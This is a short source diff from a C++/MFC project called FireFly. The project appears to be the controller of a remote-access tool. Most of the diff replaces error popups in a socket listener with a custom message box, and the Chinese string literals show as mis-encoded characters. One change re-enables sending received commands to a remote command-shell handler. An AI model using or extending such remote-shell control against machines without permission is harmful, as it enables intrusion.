@@ -2,7 +2,7 @@
 #include "resource.h"
 #include "ClientSock.h"
 #include "FireFlyDlg.h"
-
+#include "MessageBox.h"
 CArray<ServItem,ServItem&>g_ServArray;
 
 
@@ -41,9 +41,13 @@ UINT CClientSock:: MyControllingFunction(LPVOID pParam)
 {
 	CFireFlyDlg* pThis=(CFireFlyDlg*)pParam;
 	SOCKET sk=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+	CString str=L"SOCKET³õÊ¼»¯Ê§°Ü£¡";
+	CString strTitle=L"´íÎó";
+
 	if(sk==INVALID_SOCKET)
 	{
-		AfxMessageBox(L"SOCKET³õÊ¼»¯Ê§°Ü¡£");
+		CMessageBox mb(200,100,str,strTitle);
+		mb.DoModal();
 		return 0;
 	}
 
@@ -55,14 +59,16 @@ UINT CClientSock:: MyControllingFunction(LPVOID pParam)
 
 	if(SOCKET_ERROR==bind(sk,(sockaddr*)&baddr,sizeof(sockaddr_in)))
 	{
-		AfxMessageBox(L"SOCKET³õÊ¼»¯Ê§°Ü¡£");
+		CMessageBox mb(200,100,str,strTitle);
+		mb.DoModal();
 		closesocket(sk);
 		return 0;
 	}
 
 	if(listen(sk,SOMAXCONN)==SOCKET_ERROR)
 	{
-		AfxMessageBox(L"SOCKET³õÊ¼»¯Ê§°Ü¡£");
+		CMessageBox mb(200,100,str,strTitle);
+		mb.DoModal();
 		closesocket(sk);
 		return 0;
 	}
@@ -186,7 +192,7 @@ UINT __cdecl CClientSock::MyRecvFunction( LPVOID pParam )
 				pDlg->m_Process->ProcessComment(command);
 				break;
 			case MYCMDSHELL:
-			//	pDlg->m_CmdShell->CmdCommand(command);
+				pDlg->m_Cmd->CmdCommand(command);
 				break;
 			case MYSVCMANAGE:
 			//	pDlg->m_SvcManage->MySVCCommand(command);
